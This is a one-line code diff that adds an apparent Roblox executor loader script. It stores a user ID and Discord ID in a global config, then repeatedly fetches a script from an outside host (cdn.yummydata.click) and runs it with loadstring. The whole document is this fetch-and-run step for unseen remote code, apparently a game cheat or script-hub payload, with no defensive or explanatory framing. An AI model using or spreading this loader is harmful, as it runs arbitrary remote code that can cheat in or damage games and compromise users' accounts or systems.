@@ -1,0 +1,1 @@
+_G.Config={UserID="4d3f6ef5-abb6-4b9c-abfe-b6bf0d38df5c",discord_id="1045768257078054963",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/gag2"))()end)if s then break end wait(5)end
